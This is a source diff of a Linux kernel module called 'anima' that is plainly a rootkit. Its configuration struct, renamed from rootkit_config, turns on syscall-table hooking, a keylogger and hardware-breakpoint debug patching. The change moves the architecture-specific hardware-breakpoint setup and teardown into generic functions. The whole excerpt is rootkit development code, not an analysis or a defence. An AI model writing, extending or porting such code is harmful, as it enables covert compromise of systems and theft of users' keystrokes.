@@ -11,10 +11,12 @@
 
 MODULE_LICENSE("GPL");
 
-struct rootkit_config rk_cfg = {
+struct anima_config rk_cfg = {
 	.state = RK_BOOT,
+#ifdef ARCH_X86
 	.dr_protect = 1,
 	.patch_debug = 1,
+#endif
 	.hook_syscall = 1,
 	.hook_vfs = 0,
 	.keylogger = 1,
@@ -32,16 +34,10 @@ static int __init anima_init(void)
 		return 1;
 
 	/* architecture specific */
-#if ARCH_X86
-	ret = x86_hw_breakpoint_init();
+	ret = arch_hw_breakpoint_init();
 	if (ret)
 		return 1;
-#elif ARCH_ARM
-	ret = arm_hw_breakpoint_init();
-	if (ret)
-		return 1;
-	arm_hw_breakpoint_debug();
-#endif
+	arch_hw_breakpoint_debug();
 
 	if (rk_cfg.hook_syscall)
 		hook_sys_call_table();
@@ -72,11 +68,7 @@ static void __exit anima_exit(void)
 	pr_debug("%s: exit\n", __func__);
 
 	/* architecture specific */
-#if ARCH_X86
-	x86_hw_breakpoint_exit();
-#elif ARCH_ARM
-	arm_hw_breakpoint_exit();
-#endif
+	arch_hw_breakpoint_exit();
 }
 
 module_init(anima_init);
